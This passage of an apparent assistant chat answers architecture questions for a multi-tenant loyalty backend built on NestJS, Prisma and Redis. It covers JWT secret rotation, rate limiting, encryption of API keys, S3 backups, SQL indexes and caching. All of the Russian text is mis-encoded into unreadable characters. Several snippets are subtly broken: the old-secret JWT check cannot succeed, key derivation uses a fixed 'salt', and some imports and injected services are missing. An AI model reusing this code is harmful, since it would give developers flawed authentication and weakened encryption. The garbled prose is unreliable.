  // Old secrets (–≤–∞–ª–∏–¥–∏—Ä—É–µ–º —Ç–æ–∫–µ–Ω—ã –ø–æ–¥–ø–∏—Å–∞–Ω–Ω—ã–µ —Å—Ç–∞—Ä—ã–º–∏)
  oldSecrets: [
    process.env.JWT_SECRET_OLD_1,
    process.env.JWT_SECRET_OLD_2,
  ].filter(Boolean),
  
  expiresIn: '15m',
};
```

```typescript
// auth/jwt.strategy.ts
import { Injectable } from '@nestjs/common';
import { PassportStrategy } from '@nestjs/passport';
import { ExtractJwt, Strategy } from 'passport-jwt';

@Injectable()
export class JwtStrategy extends PassportStrategy(Strategy) {
  constructor(private configService: ConfigService) {
    super({
      jwtFromRequest: ExtractJwt.fromAuthHeaderAsBearerToken(),
      secretOrKeyProvider: (request, rawJwtToken, done) => {
        // –ü—Ä–æ–±—É–µ–º –≤–∞–ª–∏–¥–∏—Ä–æ–≤–∞—Ç—å current secret
        const currentSecret = configService.get('JWT_SECRET');
        
        jwt.verify(rawJwtToken, currentSecret, (err) => {
          if (!err) {
            return done(null, currentSecret);
          }
          
          // –ü—Ä–æ–±—É–µ–º old secrets
          const oldSecrets = configService.get('JWT_OLD_SECRETS') || [];
          for (const oldSecret of oldSecrets) {
            const verified = jwt.verify(rawJwtToken, oldSecret, (err) => !err);
            if (verified) {
              return done(null, oldSecret);
            }
          }
          
          // –ù–µ –ø–æ–¥–æ—à—ë–ª –Ω–∏ –æ–¥–∏–Ω
          done(new UnauthorizedException('Invalid token'));
        });
      },
    });
  }

  async validate(payload: JwtPayload) {
    return {
      userId: payload.sub,
      email: payload.email,
      tenantId: payload.tenantId,
    };
  }
}
```

**–ü—Ä–æ—Ü–µ—Å—Å —Ä–æ—Ç–∞—Ü–∏–∏:**

```bash
# –î–µ–Ω—å 1: –î–æ–±–∞–≤–ª—è–µ–º –Ω–æ–≤—ã–π secret –∫–∞–∫ primary
OLD_SECRET=$(fly secrets list | grep JWT_SECRET | awk '{print $2}')
NEW_SECRET=$(openssl rand -base64 32)

fly secrets set \
  JWT_SECRET="$NEW_SECRET" \
  JWT_SECRET_OLD_1="$OLD_SECRET"

# –î–µ–ø–ª–æ–∏–º (—Ç–µ–ø–µ—Ä—å –Ω–æ–≤—ã–µ —Ç–æ–∫–µ–Ω—ã –ø–æ–¥–ø–∏—Å—ã–≤–∞—é—Ç—Å—è NEW_SECRET, —Å—Ç–∞—Ä—ã–µ –≤–∞–ª–∏–¥–∏—Ä—É—é—Ç—Å—è)
fly deploy

# –î–µ–Ω—å 30: –£–¥–∞–ª—è–µ–º —Å—Ç–∞—Ä—ã–π secret (–≤—Å–µ —Ç–æ–∫–µ–Ω—ã —Å old secret –∏—Å—Ç–µ–∫–ª–∏ —á–µ—Ä–µ–∑ 30 –¥–Ω–µ–π)
fly secrets unset JWT_SECRET_OLD_1
```


***

### **2Ô∏è‚É£3Ô∏è‚É£ Rate limiting: –ì–¥–µ —Å—Ç–∞–≤–∏—Ç—å - Cloudflare –∏–ª–∏ Backend?**

**–í–û–ü–†–û–°:** Cloudflare WAF vs Backend rate limiting?

**–ú–û–Å –†–ï–®–ï–ù–ò–ï: –û–±–∞ —Å–ª–æ—è**

**Layer 1: Cloudflare (network level)**

```
Rate Limiting Rules:
1. 100 requests/minute per IP –¥–ª—è /api/*
2. 10 requests/minute per IP –¥–ª—è /auth/login (–±—Ä—É—Ç—Ñ–æ—Ä—Å)
3. 1000 requests/hour per IP –¥–ª—è –≤—Å–µ–≥–æ —Å–∞–π—Ç–∞
```

**Layer 2: Backend (application level)**

```typescript
// apps/backend/src/common/guards/rate-limit.guard.ts
import { Injectable, CanActivate, ExecutionContext, HttpException, HttpStatus } from '@nestjs/common';
import { Reflector } from '@nestjs/core';
import { RedisService } from '@/redis/redis.service';

interface RateLimitOptions {
  points: number;  // –ö–æ–ª–∏—á–µ—Å—Ç–≤–æ –∑–∞–ø—Ä–æ—Å–æ–≤
  duration: number;  // –ó–∞ –ø–µ—Ä–∏–æ–¥ (—Å–µ–∫—É–Ω–¥—ã)
  blockDuration?: number;  // –ù–∞ —Å–∫–æ–ª—å–∫–æ –±–ª–æ–∫–∏—Ä–æ–≤–∞—Ç—å
}

@Injectable()
export class RateLimitGuard implements CanActivate {
  constructor(
    private reflector: Reflector,
    private redis: RedisService,
  ) {}

  async canActivate(context: ExecutionContext): Promise<boolean> {
    const options = this.reflector.get<RateLimitOptions>(
      'rateLimit',
      context.getHandler(),
    );

    if (!options) return true;

    const request = context.switchToHttp().getRequest();
    const key = this.getKey(request, options);

    const current = await this.redis.get(key);
    const count = current ? parseInt(current) : 0;

    if (count >= options.points) {
      throw new HttpException(
        {
          statusCode: HttpStatus.TOO_MANY_REQUESTS,
          message: 'Too many requests',
          retryAfter: options.duration,
        },
        HttpStatus.TOO_MANY_REQUESTS,
      );
    }

    // Increment counter
    if (count === 0) {
      await this.redis.set(key, '1', options.duration);
    } else {
      await this.redis.incr(key);
    }

    return true;
  }

  private getKey(request: any, options: RateLimitOptions): string {
    const ip = request.ip;
    const userId = request.user?.id || 'anonymous';
    const endpoint = request.route.path;
    
    return `ratelimit:${endpoint}:${userId}:${ip}`;
  }
}

// Decorator
export const RateLimit = (options: RateLimitOptions) => 
  SetMetadata('rateLimit', options);
```

**–ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ:**

```typescript
@Post('login')
@RateLimit({ points: 5, duration: 900 })  // 5 –ø–æ–ø—ã—Ç–æ–∫ –∑–∞ 15 –º–∏–Ω—É—Ç
async login(@Body() dto: LoginDto) {
  // ...
}

@Post('loyalty/transactions')
@RateLimit({ points: 100, duration: 60 })  // 100 —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–π –≤ –º–∏–Ω—É—Ç—É
async createTransaction(@Body() dto: CreateTransactionDto) {
  // ...
}
```


***

### **2Ô∏è‚É£4Ô∏è‚É£ API Keys –¥–ª—è –≤–Ω–µ—à–Ω–∏—Ö –∏–Ω—Ç–µ–≥—Ä–∞—Ü–∏–π: –ö–∞–∫ —Ö—Ä–∞–Ω–∏—Ç—å?**

**–í–û–ü–†–û–°:** POS —Å–∏—Å—Ç–µ–º—ã –∏ –ø–ª–∞—Ç—ë–∂–Ω—ã–µ –ø—Ä–æ–≤–∞–π–¥–µ—Ä—ã –¥–∞—é—Ç API keys. –ö–∞–∫ –±–µ–∑–æ–ø–∞—Å–Ω–æ —Ö—Ä–∞–Ω–∏—Ç—å?

**–ú–û–Å –†–ï–®–ï–ù–ò–ï:**

**–ß—É–≤—Å—Ç–≤–∏—Ç–µ–ª—å–Ω–æ—Å—Ç—å –¥–∞–Ω–Ω—ã—Ö:**


| –¢–∏–ø | –•—Ä–∞–Ω–µ–Ω–∏–µ | –ü—Ä–∏–º–µ—Ä |
| :-- | :-- | :-- |
| **Platform secrets** | Fly.io secrets | JWT_SECRET, DATABASE_URL |
| **Tenant-specific** | Database encrypted | POS API key tenant'–∞ |
| **Public keys** | Config/ENV | Telegram Bot Token (public) |

**Encryption –≤ –ë–î:**

```typescript
// apps/backend/src/common/encryption/encryption.service.ts
import { Injectable } from '@nestjs/common';
import * as crypto from 'crypto';

@Injectable()
export class EncryptionService {
  private readonly algorithm = 'aes-256-gcm';
  private readonly key: Buffer;

  constructor() {
    // –ì–µ–Ω–µ—Ä–∏—Ä—É–µ–º –∫–ª—é—á –∏–∑ ENCRYPTION_KEY (32 bytes)
    this.key = crypto.scryptSync(
      process.env.ENCRYPTION_KEY,
      'salt',
      32,
    );
  }

  encrypt(text: string): string {
    const iv = crypto.randomBytes(16);
    const cipher = crypto.createCipheriv(this.algorithm, this.key, iv);
    
    let encrypted = cipher.update(text, 'utf8', 'hex');
    encrypted += cipher.final('hex');
    
    const authTag = cipher.getAuthTag();
    
    // iv:authTag:encrypted
    return `${iv.toString('hex')}:${authTag.toString('hex')}:${encrypted}`;
  }

  decrypt(encryptedText: string): string {
    const [ivHex, authTagHex, encrypted] = encryptedText.split(':');
    
    const iv = Buffer.from(ivHex, 'hex');
    const authTag = Buffer.from(authTagHex, 'hex');
    const decipher = crypto.createDecipheriv(this.algorithm, this.key, iv);
    
    decipher.setAuthTag(authTag);
    
    let decrypted = decipher.update(encrypted, 'hex', 'utf8');
    decrypted += decipher.final('utf8');
    
    return decrypted;
  }
}
```

**–ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ –≤ Entity:**

```typescript
// POS Integration entity
{
  id: 'uuid',
  tenantId: 'tenant-123',
  provider: 'iiko',
  apiKey: 'encrypted:iv:authTag:data',  // –ó–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω–æ
  webhookSecret: 'encrypted:...',
}

// –ü—Ä–∏ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏–∏
const encrypted = encryptionService.encrypt(apiKey);
await prisma.posIntegration.create({
  data: {
    apiKey: encrypted,
    // ...
  },
});

// –ü—Ä–∏ —á—Ç–µ–Ω–∏–∏
const integration = await prisma.posIntegration.findUnique({ ... });
const decrypted = encryptionService.decrypt(integration.apiKey);
```


***

### **2Ô∏è‚É£5Ô∏è‚É£ Backup strategy: –ö–∞–∫ –Ω–µ –ø–æ—Ç–µ—Ä—è—Ç—å –¥–∞–Ω–Ω—ã–µ?**

**–í–û–ü–†–û–°:** –ê–≤—Ç–æ–±—ç–∫–∞–ø—ã –ë–î –∏ –∫–∞–∫ –≤–æ—Å—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞—Ç—å?

**–ú–û–Å –†–ï–®–ï–ù–ò–ï (Neon.tech + manual S3):**

**Layer 1: Neon.tech automatic backups**

- ‚úÖ Point-in-time recovery (–ø–æ—Å–ª–µ–¥–Ω–∏–µ 7 –¥–Ω–µ–π –Ω–∞ free tier)
- ‚úÖ –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏–µ snapshots
- ‚úÖ –í–æ—Å—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∏–µ —á–µ—Ä–µ–∑ UI

```bash
# –í–æ—Å—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∏–µ –Ω–∞ –æ–ø—Ä–µ–¥–µ–ª—ë–Ω–Ω–æ–µ –≤—Ä–µ–º—è
neon branches create --from main --timestamp "2026-02-12T10:00:00Z"
```

**Layer 2: Manual SQL dumps –≤ S3 (–µ–∂–µ–¥–Ω–µ–≤–Ω–æ)**

```typescript
// apps/backend/src/cron/backup.job.ts
import { Injectable } from '@nestjs/common';
import { Cron, CronExpression } from '@nestjs/schedule';
import { exec } from 'child_process';
import { promisify } from 'util';
import { S3Service } from '@/storage/s3.service';

const execAsync = promisify(exec);

@Injectable()
export class BackupJob {
  constructor(private s3: S3Service) {}

  @Cron(CronExpression.EVERY_DAY_AT_3AM)
  async backupDatabase() {
    const timestamp = new Date().toISOString();
    const filename = `backup-${timestamp}.sql.gz`;

    try {
      // pg_dump ‚Üí gzip
      await execAsync(
        `pg_dump $DATABASE_URL | gzip > /tmp/${filename}`,
      );

      // Upload to S3
      await this.s3.uploadFile(
        `/tmp/${filename}`,
        `backups/${filename}`,
      );

      // Cleanup local file
      await execAsync(`rm /tmp/${filename}`);

      console.log(`‚úÖ Backup created: ${filename}`);
    } catch (error) {
      console.error('‚ùå Backup failed:', error);
      // Alert —á–µ—Ä–µ–∑ Better Stack
    }
  }

  // –£–¥–∞–ª–µ–Ω–∏–µ —Å—Ç–∞—Ä—ã—Ö –±—ç–∫–∞–ø–æ–≤ (> 30 –¥–Ω–µ–π)
  @Cron(CronExpression.EVERY_WEEK)
  async cleanupOldBackups() {
    const thirtyDaysAgo = new Date();
    thirtyDaysAgo.setDate(thirtyDaysAgo.getDate() - 30);

    const objects = await this.s3.listObjects('backups/');
    
    for (const obj of objects) {
      if (obj.LastModified < thirtyDaysAgo) {
        await this.s3.deleteObject(obj.Key);
        console.log(`üóëÔ∏è Deleted old backup: ${obj.Key}`);
      }
    }
  }
}
```

**–í–æ—Å—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∏–µ:**

```bash
# 1. –°–∫–∞—á–∏–≤–∞–µ–º backup –∏–∑ S3
aws s3 cp s3://max-loyalty/backups/backup-2026-02-12.sql.gz .

# 2. –†–∞—Å–ø–∞–∫–æ–≤—ã–≤–∞–µ–º
gunzip backup-2026-02-12.sql.gz

# 3. –í–æ—Å—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º
psql $DATABASE_URL < backup-2026-02-12.sql
```


***

–ü—Ä–æ–¥–æ–ª–∂–∏—Ç—å —Å –ø–æ—Å–ª–µ–¥–Ω–∏–º–∏ 10 –≤–æ–ø—Ä–æ—Å–∞–º–∏ (–º–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥ –¥–µ—Ç–∞–ª—å–Ω–æ, production checklist)? üéØ

---

# –ü—Ä–æ–¥–æ–ª–∂–∞–π

–ü—Ä–æ–¥–æ–ª–∂–∞—é! üöÄ

***

## üìà **–ë–õ–û–ö 5: PERFORMANCE \& OPTIMIZATION (5 –≤–æ–ø—Ä–æ—Å–æ–≤)**

### **2Ô∏è‚É£6Ô∏è‚É£ Database indexes: –ö–∞–∫–∏–µ –∏–Ω–¥–µ–∫—Å—ã —Å–æ–∑–¥–∞—Ç—å –¥–ª—è production?**

**–í–û–ü–†–û–°:** –ö–∞–∫–∏–µ –∏–Ω–¥–µ–∫—Å—ã –∫—Ä–∏—Ç–∏—á–Ω—ã –¥–ª—è –ø—Ä–æ–∏–∑–≤–æ–¥–∏—Ç–µ–ª—å–Ω–æ—Å—Ç–∏?

**–ú–û–Å –†–ï–®–ï–ù–ò–ï (–ê–Ω–∞–ª–∏–∑ –∑–∞–ø—Ä–æ—Å–æ–≤ –∏–∑ Backend API):**

```sql
-- prisma/migrations/YYYYMMDD_performance_indexes/migration.sql

-- ============================================
-- GUESTS & CARDS
-- ============================================

-- –ü–æ–∏—Å–∫ –≥–æ—Å—Ç—è –ø–æ —Ç–µ–ª–µ—Ñ–æ–Ω—É (–∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—è, —Å–æ–∑–¥–∞–Ω–∏–µ)
CREATE INDEX CONCURRENTLY IF NOT EXISTS "Guest_phone_idx" 
  ON "Guest"("phone") WHERE "status" != 'DELETED';

-- –ü–æ–∏—Å–∫ –≥–æ—Å—Ç—è –ø–æ email
CREATE INDEX CONCURRENTLY IF NOT EXISTS "Guest_email_idx" 
  ON "Guest"("email") WHERE "email" IS NOT NULL;

-- –ü–æ–∏—Å–∫ –≥–æ—Å—Ç—è –ø–æ telegram_id
CREATE INDEX CONCURRENTLY IF NOT EXISTS "Guest_telegram_id_idx" 
  ON "Guest"("telegram_id") WHERE "telegram_id" IS NOT NULL;

-- –ü–æ–∏—Å–∫ –∫–∞—Ä—Ç –ø–æ tenant (—Å–ø–∏—Å–æ–∫ –≥–æ—Å—Ç–µ–π –≤ –∞–¥–º–∏–Ω–∫–µ)
CREATE INDEX CONCURRENTLY IF NOT EXISTS "GuestCard_tenant_status_idx" 
  ON "GuestCard"("tenant_id", "status") 
  INCLUDE ("total_balance", "level_id", "created_at");

-- –ü–æ–∏—Å–∫ –∫–∞—Ä—Ç—ã –ø–æ QR –∫–æ–¥—É (—Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ –Ω–∞ –∫–∞—Å—Å–µ)
CREATE INDEX CONCURRENTLY IF NOT EXISTS "GuestCard_qr_code_idx" 
  ON "GuestCard"("qr_code") WHERE "status" = 'ACTIVE';

-- –ü–æ–∏—Å–∫ –∫–∞—Ä—Ç—ã –ø–æ 6-digit –∫–æ–¥—É
CREATE INDEX CONCURRENTLY IF NOT EXISTS "GuestCard_display_code_idx" 
  ON "GuestCard"("display_code") WHERE "status" = 'ACTIVE';

-- ============================================
-- TRANSACTIONS
-- ============================================

-- –ò—Å—Ç–æ—Ä–∏—è —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–π –≥–æ—Å—Ç—è (–ø—Ä–æ—Ñ–∏–ª—å –≤ Telegram)
CREATE INDEX CONCURRENTLY IF NOT EXISTS "BallTransaction_card_created_idx" 
  ON "BallTransaction"("guest_card_id", "created_at" DESC) 
  INCLUDE ("type", "amount", "description");

-- –¢—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏ –ø–æ tenant (–∞–Ω–∞–ª–∏—Ç–∏–∫–∞)
CREATE INDEX CONCURRENTLY IF NOT EXISTS "BallTransaction_tenant_created_idx" 
  ON "BallTransaction"("tenant_id", "created_at" DESC) 
  WHERE "type" IN ('EARN', 'REDEEM');

-- –ü–æ–∏—Å–∫ –ø–æ POS check ID (reconciliation)
CREATE INDEX CONCURRENTLY IF NOT EXISTS "BallTransaction_pos_check_idx" 
  ON "BallTransaction"("pos_transaction_id") 
  WHERE "pos_transaction_id" IS NOT NULL;

-- ============================================
-- LOYALTY RULES
-- ============================================

-- –ê–∫—Ç–∏–≤–Ω—ã–µ –ø—Ä–∞–≤–∏–ª–∞ –¥–ª—è tenant (—Ä–∞—Å—á—ë—Ç –±–∞–ª–ª–æ–≤)
CREATE INDEX CONCURRENTLY IF NOT EXISTS "LoyaltyRule_tenant_active_idx" 
  ON "LoyaltyRule"("tenant_id", "is_active", "priority" DESC) 
  WHERE "is_active" = true;

-- ============================================
-- PROMO
-- ============================================

-- –ê–∫—Ç–∏–≤–Ω—ã–µ –ø—Ä–æ–º–æ –¥–ª—è tenant
CREATE INDEX CONCURRENTLY IF NOT EXISTS "Promo_tenant_active_dates_idx" 
  ON "Promo"("tenant_id", "is_active", "start_date", "end_date") 
  WHERE "is_active" = true;

-- –ü—Ä–æ–≤–µ—Ä–∫–∞ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è –ø—Ä–æ–º–æ –≥–æ—Å—Ç–µ–º
CREATE INDEX CONCURRENTLY IF NOT EXISTS "PromoBallGranted_guest_promo_idx" 
  ON "PromoBallGranted"("guest_card_id", "promo_id", "created_at" DESC);

-- ============================================
-- USERS & AUTH
-- ============================================

-- –ü–æ–∏—Å–∫ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –ø–æ email/phone (–ª–æ–≥–∏–Ω)
CREATE INDEX CONCURRENTLY IF NOT EXISTS "User_email_idx" 
  ON "User"("email") WHERE "email" IS NOT NULL;

CREATE INDEX CONCURRENTLY IF NOT EXISTS "User_phone_idx" 
  ON "User"("phone") WHERE "phone" IS NOT NULL;

-- –°–µ—Å—Å–∏–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è (–ø—Ä–æ–≤–µ—Ä–∫–∞ refresh token)
CREATE INDEX CONCURRENTLY IF NOT EXISTS "UserSession_user_token_idx" 
  ON "UserSession"("user_id", "refresh_token") 
  WHERE "expires_at" > NOW();

-- ============================================
-- TENANTS & SUBSCRIPTIONS
-- ============================================

-- –ê–∫—Ç–∏–≤–Ω—ã–µ –ø–æ–¥–ø–∏—Å–∫–∏ (–ø—Ä–æ–≤–µ—Ä–∫–∞ –ª–∏–º–∏—Ç–æ–≤)
CREATE INDEX CONCURRENTLY IF NOT EXISTS "Subscription_tenant_status_idx" 
  ON "Subscription"("tenant_id", "status") 
  WHERE "status" IN ('ACTIVE', 'PAST_DUE');

-- ============================================
-- ANALYTICS (–ø—Ä–µ–¥—Ä–∞—Å—á–∏—Ç–∞–Ω–Ω—ã–µ —Ç–∞–±–ª–∏—Ü—ã)
-- ============================================

-- –î–Ω–µ–≤–Ω–∞—è –∞–Ω–∞–ª–∏—Ç–∏–∫–∞ –ø–æ tenant
CREATE INDEX CONCURRENTLY IF NOT EXISTS "AnalyticsDailySnapshot_tenant_date_idx" 
  ON "AnalyticsDailySnapshot"("tenant_id", "date" DESC);

-- ============================================
-- PARTIAL INDEXES (—ç–∫–æ–Ω–æ–º–∏–º –º–µ—Å—Ç–æ)
-- ============================================

-- –¢–æ–ª—å–∫–æ –∞–∫—Ç–∏–≤–Ω—ã–µ –∫–∞—Ä—Ç—ã
CREATE INDEX CONCURRENTLY IF NOT EXISTS "GuestCard_active_idx" 
  ON "GuestCard"("tenant_id", "guest_id") 
  WHERE "status" = 'ACTIVE';

-- –¢–æ–ª—å–∫–æ –Ω–µ–∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–Ω—ã–µ –ø—Ä–æ–º–æ
CREATE INDEX CONCURRENTLY IF NOT EXISTS "Promo_unused_idx" 
  ON "Promo"("tenant_id", "promo_type") 
  WHERE "is_active" = true AND "end_date" > NOW();
```

**–ü—Ä–æ–≤–µ—Ä–∫–∞ —ç—Ñ—Ñ–µ–∫—Ç–∏–≤–Ω–æ—Å—Ç–∏:**

```typescript
// scripts/analyze-queries.ts
import { PrismaClient } from '@prisma/client';

const prisma = new PrismaClient();

async function analyzeSlowQueries() {
  // –í–∫–ª—é—á–∞–µ–º –ª–æ–≥–∏—Ä–æ–≤–∞–Ω–∏–µ –º–µ–¥–ª–µ–Ω–Ω—ã—Ö –∑–∞–ø—Ä–æ—Å–æ–≤
  await prisma.$executeRaw`
    ALTER DATABASE max_loyalty_prod SET log_min_duration_statement = 1000;
  `;

  // –°–º–æ—Ç—Ä–∏–º —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫—É –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è –∏–Ω–¥–µ–∫—Å–æ–≤
  const indexStats = await prisma.$queryRaw`
    SELECT
      schemaname,
      tablename,
      indexname,
      idx_scan as index_scans,
      idx_tup_read as tuples_read,
      idx_tup_fetch as tuples_fetched
    FROM pg_stat_user_indexes
    WHERE idx_scan = 0  -- –ù–µ–∏—Å–ø–æ–ª—å–∑—É–µ–º—ã–µ –∏–Ω–¥–µ–∫—Å—ã
    ORDER BY tablename;
  `;

  console.log('Unused indexes:', indexStats);

  // –ü—Ä–æ–≤–µ—Ä—è–µ–º —Å–∞–º—ã–µ –º–µ–¥–ª–µ–Ω–Ω—ã–µ –∑–∞–ø—Ä–æ—Å—ã
  const slowQueries = await prisma.$queryRaw`
    SELECT
      query,
      calls,
      total_exec_time,
      mean_exec_time,
      max_exec_time
    FROM pg_stat_statements
    WHERE mean_exec_time > 100  -- > 100ms
    ORDER BY mean_exec_time DESC
    LIMIT 20;
  `;

  console.log('Slow queries:', slowQueries);
}
```


***

### **2Ô∏è‚É£7Ô∏è‚É£ Caching strategy: –ß—Ç–æ –∫—ç—à–∏—Ä–æ–≤–∞—Ç—å –∏ –Ω–∞ —Å–∫–æ–ª—å–∫–æ?**

**–í–û–ü–†–û–°:** –ö–∞–∫–∏–µ –¥–∞–Ω–Ω—ã–µ –∫—ç—à–∏—Ä–æ–≤–∞—Ç—å –≤ Redis –¥–ª—è —Å–Ω–∏–∂–µ–Ω–∏—è –Ω–∞–≥—Ä—É–∑–∫–∏ –Ω–∞ –ë–î?

**–ú–û–Å –†–ï–®–ï–ù–ò–ï (Layered caching):**

```typescript
// apps/backend/src/cache/cache.service.ts
import { Injectable } from '@nestjs/common';
import { RedisService } from '@/redis/redis.service';

@Injectable()
export class CacheService {
  constructor(private redis: RedisService) {}

  // ============================================
  // LAYER 1: SHORT-TERM CACHE (1-5 –º–∏–Ω—É—Ç)
  // –ß–∞—Å—Ç–æ —á–∏—Ç–∞–µ–º—ã–µ –¥–∞–Ω–Ω—ã–µ, –∫–æ—Ç–æ—Ä—ã–µ –º–æ–≥—É—Ç —É—Å—Ç–∞—Ä–µ—Ç—å
  // ============================================

  // –ê–∫—Ç–∏–≤–Ω—ã–µ –ø—Ä–∞–≤–∏–ª–∞ –ª–æ—è–ª—å–Ω–æ—Å—Ç–∏ tenant'–∞
  async getLoyaltyRules(tenantId: string) {
    const key = `loyalty:rules:${tenantId}`;
    const cached = await this.redis.get(key);
    
    if (cached) {
      return JSON.parse(cached);
    }

    const rules = await this.prisma.loyaltyRule.findMany({
      where: { tenantId, isActive: true },
      orderBy: { priority: 'desc' },
    });

    await this.redis.set(key, JSON.stringify(rules), 300); // 5 –º–∏–Ω—É—Ç
    return rules;
  }

  // –£—Ä–æ–≤–Ω–∏ –ª–æ—è–ª—å–Ω–æ—Å—Ç–∏
  async getLoyaltyLevels(tenantId: string) {
    const key = `loyalty:levels:${tenantId}`;
    const cached = await this.redis.get(key);
    
    if (cached) return JSON.parse(cached);

    const levels = await this.prisma.loyaltyLevel.findMany({
      where: { tenantId },
      orderBy: { thresholdAmount: 'asc' },
    });

    await this.redis.set(key, JSON.stringify(levels), 300);
    return levels;
  }

  // ============================================
  // LAYER 2: MEDIUM-TERM CACHE (1 —á–∞—Å)
  // –†–µ–¥–∫–æ –º–µ–Ω—è—é—â–∏–µ—Å—è –¥–∞–Ω–Ω—ã–µ
  // ============================================

  // –ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è tenant'–∞
  async getTenantConfig(tenantId: string) {
    const key = `tenant:config:${tenantId}`;
    const cached = await this.redis.get(key);
    
    if (cached) return JSON.parse(cached);

    const config = await this.prisma.tenant.findUnique({
      where: { id: tenantId },
      include: { subscription: true },
    });

    await this.redis.set(key, JSON.stringify(config), 3600); // 1 —á–∞—Å
    return config;
  }

  // ============================================
  // LAYER 3: LONG-TERM CACHE (24 —á–∞—Å–∞)
  // –°—Ç–∞—Ç–∏—á–µ—Å–∫–∏–µ –¥–∞–Ω–Ω—ã–µ
  // ============================================

  // –°–ø–∏—Å–æ–∫ —Ç–∞—Ä–∏—Ñ–æ–≤
  async getSubscriptionPlans() {
    const key = 'plans:all';
    const cached = await this.redis.get(key);
    
    if (cached) return JSON.parse(cached);

    const plans = await this.prisma.subscriptionPlan.findMany();

    await this.redis.set(key, JSON.stringify(plans), 86400); // 24 —á–∞—Å–∞
    return plans;
  }

  // ============================================
  // LAYER 4: SESSION CACHE (JWT payload)
  // –î–æ –∏—Å—Ç–µ—á–µ–Ω–∏—è —Ç–æ–∫–µ–Ω–∞
  // ============================================

  async cacheUserSession(userId: string, payload: any, ttl: number) {
    const key = `session:${userId}`;
    await this.redis.set(key, JSON.stringify(payload), ttl);
  }

  async getUserSession(userId: string) {
    const key = `session:${userId}`;
    const cached = await this.redis.get(key);
    return cached ? JSON.parse(cached) : null;
  }

  // ============================================
  // INVALIDATION HELPERS
  // ============================================

  async invalidateLoyaltyCache(tenantId: string) {
    await this.redis.del(`loyalty:rules:${tenantId}`);
    await this.redis.del(`loyalty:levels:${tenantId}`);
  }

  async invalidateTenantCache(tenantId: string) {
    // Invalidate all tenant-related caches
    const pattern = `*:${tenantId}`;
    const keys = await this.redis.keys(pattern);
    if (keys.length > 0) {
      await Promise.all(keys.map(key => this.redis.del(key)));
    }
  }
}
```

**Cache-aside pattern –≤ —Å–µ—Ä–≤–∏—Å–∞—Ö:**

```typescript
// loyalty/loyalty-rules.service.ts
@Injectable()
export class LoyaltyRulesService {
  constructor(
    private cache: CacheService,
    private prisma: PrismaService,
  ) {}

  async getActiveRules(tenantId: string) {
    // 1. Try cache
    return this.cache.getLoyaltyRules(tenantId);
  }

  async updateRule(id: string, data: UpdateRuleDto) {
    // 1. Update DB
    const rule = await this.prisma.loyaltyRule.update({
      where: { id },
      data,
    });

    // 2. Invalidate cache
    await this.cache.invalidateLoyaltyCache(rule.tenantId);

    return rule;
  }
}
```

**Cache warming (preloading):**

```typescript
// cron/cache-warming.job.ts
@Injectable()
export class CacheWarmingJob {
  constructor(private cache: CacheService) {}

  // –ü—Ä–æ–≥—Ä–µ–≤–∞–µ–º –∫—ç—à –¥–ª—è –∞–∫—Ç–∏–≤–Ω—ã—Ö tenant'–æ–≤ –∫–∞–∂–¥—ã–µ 10 –º–∏–Ω—É—Ç
  @Cron('*/10 * * * *')
  async warmCache() {
    const activeTenants = await this.prisma.tenant.findMany({
      where: {
        subscription: {
          status: 'ACTIVE',
        },
      },
      take: 100, // Top 100 –∞–∫—Ç–∏–≤–Ω—ã—Ö
    });

    for (const tenant of activeTenants) {
      // Prewarm frequently accessed data
      await this.cache.getLoyaltyRules(tenant.id);
      await this.cache.getLoyaltyLevels(tenant.id);
    }

    console.log(`‚úÖ Cache warmed for ${activeTenants.length} tenants`);
  }
}
```


***

### **2Ô∏è‚É£8Ô∏è‚É£ Database connection pooling: –°–∫–æ–ª—å–∫–æ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏–π –Ω—É–∂–Ω–æ?**

**–í–û–ü–†–û–°:** –ö–∞–∫ –Ω–∞—Å—Ç—Ä–æ–∏—Ç—å connection pool –¥–ª—è 256 MB RAM –Ω–∞ Fly.io?

**–ú–û–Å –†–ï–®–ï–ù–ò–ï:**

**–†–∞—Å—á—ë—Ç:**

```
256 MB RAM per VM
- 50 MB Node.js runtime
- 50 MB application code
- 100 MB –¥–ª—è –∑–∞–ø—Ä–æ—Å–æ–≤
= ~56 MB –¥–ª—è DB connections

–û–¥–Ω–æ PostgreSQL —Å–æ–µ–¥–∏–Ω–µ–Ω–∏–µ ‚âà 2-3 MB RAM
56 MB / 3 MB = ~18 connections max

–ë–µ–∑–æ–ø–∞—Å–Ω–æ–µ –∑–Ω–∞—á–µ–Ω–∏–µ: 10 connections per VM
```

**Prisma config:**

```typescript
// apps/backend/src/database/prisma.service.ts
import { Injectable, OnModuleInit, OnModuleDestroy } from '@nestjs/common';
import { PrismaClient } from '@prisma/client';

@Injectable()
export class PrismaService extends PrismaClient implements OnModuleInit, OnModuleDestroy {
  constructor() {
    super({
      datasources: {
        db: {
          url: process.env.DATABASE_URL,
        },
      },
      log: process.env.NODE_ENV === 'development' 
        ? ['query', 'error', 'warn'] 
        : ['error'],
      
      // Connection pool settings
      // https://www.prisma.io/docs/concepts/components/prisma-client/connection-pool
    });
  }

  async onModuleInit() {
